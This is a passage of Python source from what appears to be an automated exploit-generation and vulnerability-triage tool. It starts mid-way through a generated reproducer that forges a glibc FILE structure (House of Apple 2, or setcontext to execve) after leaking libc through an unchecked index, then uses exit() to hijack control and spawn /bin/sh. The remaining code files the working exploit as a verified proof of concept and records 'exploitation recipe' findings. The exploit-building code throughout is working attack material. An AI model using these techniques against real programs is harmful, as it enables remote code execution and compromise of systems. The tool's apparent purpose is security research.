            "    flags=next(v for v in rd(fp+F['flags']) if v>>16==0xFBAD)\n"
            "    wr(ARR+F['doalloc'], base+SCENTRY)\n"
            "    wr(wide+F['wd_vt'], ARR)\n"
            "    wr(fp+F['wptr'], 1)\n"
            "    wr(fp+GREGS['rdi'], base+BINSH)\n"
            "    wr(fp+GREGS['rsi'], 0)\n"
            "    wr(fp+GREGS['rdx'], 0)\n"
            "    wr(fp+RIP_AT, base+EXECVE)\n"
            "    wr(fp+F['flags'], (flags & ~0x2) | 0x8000)\n"
            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
            "else:\n"
            "    wr(ARR+F['doalloc'], base+S['system'])\n"
            "    wr(wide+F['wd_vt'], ARR)\n"
            "    wr(fp+F['wptr'], 1)\n"
            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
            "    wr(fp+F['flags'], struct.unpack('<Q', b' /bin/sh')[0])\n"
            "for e in EXITS:\n"
            "    out=op(e.encode('latin1'),0.6)+op(b'id\\n',1.0)\n"
            "    if b'uid=' in out:\n"
            "        print(out.decode('latin1','replace')); print('SHELL'); break\n"
            "else:\n"
            "    print('no shell'); sys.exit(1)\n").encode()


def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, model):
    """File the no-win write-what-where shell as an L3 verified PoC (bundle = target + a runnable
    leak-then-forge reproducer)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    exits = _exit_sequences([writer, reader], model, width)
    plan = res.get("plan") or "system"
    script = _www_repro_script(arr_name=arr["name"], arr_addr=arr["addr"],
                               stride=arr.get("stride", 8) or 8, writer=writer, reader=reader,
                               fields=model[writer], rfields=model[reader], width=width,
                               exits=exits, plan=plan, targets=res.get("targets"))
    # What the hijack actually ends up calling, per plan.
    finish = res.get("finish") or plan
    effect = ('execve("/bin/sh", NULL, NULL) through setcontext' if finish == "setcontext"
              else 'system("/bin/sh")' if plan == "stack" else 'system(" /bin/sh")')
    # The stack plan is not FSOP at all, so it gets its own name and its own description of HOW.
    route = ("the environ route (main's saved return address)" if plan == "stack"
             else "House of Apple 2")
    how = (f"option {reader} read libc's `environ` through the unchecked index to disclose a "
           f"stack address, walked down it for MAIN's saved return address (the first libc code "
           f"pointer that is not inside __libc_start_main), and option {writer} wrote a "
           f"{len(res.get('cells') or ())}-word system(\"/bin/sh\") chain over it; returning "
           f"from main ran the chain"
           if plan == "stack" else
           f"option {reader} read {res['fp_name']}'s own _wide_data; option {writer} wrote "
           f"{len(res.get('cells') or ())} House-of-Apple-2 cells ({plan} plan) over that FILE "
           f"through {arr['name']}, with the fake wide jump table placed inside {arr['name']} "
           f"itself; exit() flushed the forged FILE and its _IO_wfile_overflow called {effect}")
    input_sha = ctx.put_artifact("www-fsop-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->{route}/{plan} (no win, libc leaked in band)",
            "libc_base": hex(res["libc_base"]), "forged": res["fp_name"],
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": effect, "offset": None,
                                   "confirmed": True,
                                   "note": f"write-what-where -> {route}"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    eff = (f"working exploit ({vclass} -> arbitrary write -> code execution) with NO win function "
           f"and no system() in the target's PLT: option {reader} read a GOT slot through the "
           f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on); then "
           f"{how}, calling {effect}. Confirmed by a shell that echoed our marker -- every cell "
           f"read back before the trigger, all in ONE process.")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": "Code execution (demonstrated): L3 arbitrary write -> "
                     + ("saved return address" if plan == "stack" else "FSOP"),
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:fsop:{target.id}", "site_detail": arr["name"],
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": f"Arbitrary write -> {route} shell (no win function)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff, "shell": True}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": None, "exploit": "www-fsop", "shell": True, "writer": writer, "reader": reader,
             "libc_base": hex(res["libc_base"]), "forged": res["fp_name"], "cells": res["cells"],
             "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {route} -> {effect} (no win)")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "shell": True,
                        "exploit": "www-fsop"}}


def _annotate_lead_ceiling(ctx, target, lead, *, level, why) -> None:
    """Record on the LEAD how far its chain got and why it stopped.

    `_file_recipe` writes a second row ("Exploitation recipe: ...") and leaves the lead untouched,
    so one defect becomes two corroborated rows and NEITHER says where the attempt ended --
    measured, `chain_primitive`'s own recipe finding stayed below poc-backed 7 times out of 7
    alongside the `oob_index` lead that produced it. A reader then sees two potentials and no
    account of what was tried. The ceiling goes on the lead, in its own channel, so it survives
    the next re-run of whichever detector owns the row."""
    from ...db.dao import FindingDAO
    try:
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": lead.cwe, "title": lead.title, "severity": lead.severity,
            "detector": lead.detector, "state": lead.state, "confidence": lead.confidence,
            "dedup_key": lead.dedup_key,
            "evidence": [{"channel": "chain-ceiling",
                          "detail": f"weaponization reached {level} and stopped: {why}"}]})
    except Exception:                                    # noqa: BLE001 -- never fail the filing
        observe.absorbed(_log, "leaving the lead alone")


def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
    """L2 guidance: the concrete technique + target to finish the chain by hand."""
    from ...db.dao import FindingDAO
    tech = recipe.get("technique", "heap-technique")
    tgt = f" -> {win[0]} (0x{win[1]:x})" if win else ""
    detail = (f"{vclass} primitive can be chained via {tech}{tgt}, but a live hijack was not "
              f"demonstrated here ({why}). {recipe.get('note', '')}").strip()
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": lead.cwe, "title": f"Exploitation recipe: {vclass} -> {tech}",
        "severity": "high", "detector": "chain_primitive", "state": "corroborated",
        "confidence": 0.5, "dedup_key": f"chain-recipe:{vclass}:{target.id}",
        "site_detail": tech,
        "evidence": [{"channel": "chain", "detail": detail}]})
    _annotate_lead_ceiling(ctx, target, lead, level="L2", why=why)

def register() -> None:
    register_stage(CHAIN_STAGE, chain_primitive_stage, resource_class="cpu",
                   tool="ptrace", tool_version=TOOL_VERSION)


def enqueue_chain(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, CHAIN_STAGE, target_id=target.id,
                         params=params or {}, force=force)
